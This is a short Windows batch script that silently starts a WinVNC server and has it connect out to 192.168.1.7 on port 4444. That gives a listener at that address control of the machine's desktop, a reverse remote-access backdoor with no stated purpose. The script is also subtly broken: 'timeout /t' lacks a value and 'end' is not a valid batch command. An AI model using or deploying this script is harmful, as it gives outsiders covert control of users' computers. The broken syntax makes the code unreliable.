@echo off
start winvnc.exe -run
timeout /t >nul
start winvnc.exe -connect 192.168.1.7::4444
end
